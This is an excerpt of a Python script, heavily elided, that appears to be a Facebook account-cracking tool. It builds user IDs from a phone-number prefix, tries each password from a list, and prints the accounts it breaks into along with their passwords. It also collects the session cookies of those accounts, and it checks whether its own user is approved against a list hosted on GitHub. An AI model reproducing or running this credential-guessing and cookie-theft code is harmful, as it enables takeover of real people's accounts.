...
def afg():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 078,077,0870')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [HAROON KHAN==>OK]\33[0;m\033[1;33m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Mafia9370/MR23/blob/main/Approve.txt').text
    if id in httpCaht:
